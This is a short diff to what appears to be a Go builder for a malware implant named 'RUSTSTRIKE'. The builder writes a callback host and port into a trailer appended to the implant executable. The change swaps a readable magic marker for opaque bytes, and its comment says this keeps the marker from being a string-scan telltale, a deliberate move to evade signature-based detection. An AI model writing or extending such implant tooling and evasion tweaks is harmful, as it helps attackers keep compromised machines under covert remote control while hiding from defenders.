@@ -7,11 +7,14 @@
 //
 // The trailer layout (matching crates/implant/src/main.rs::read_trailer_config):
 //
-//	<exe bytes>... "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"
+//	<exe bytes>... <magic> <host> "\x00" <port> "\x00"
 //
 // The implant reads the last ~512 bytes of its own exe at startup to find the
 // magic; if absent it falls back to args[1]/args[2]. Re-running on an already-
 // patched exe strips the old trailer first (no accumulation).
+//
+// `magic` is an opaque byte sequence (not a readable word) so the marker isn't
+// a string-scan telltale; crates/implant/src/main.rs::TRAILER_MAGIC must match.
 //
 // Build:
 //
@@ -24,7 +27,7 @@ import (
 	"os"
 )
 
-var magic = []byte("RUSTSTRIKE\x01")
+var magic = []byte{0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3}
 
 func main() {
 	if len(os.Args) != 5 {
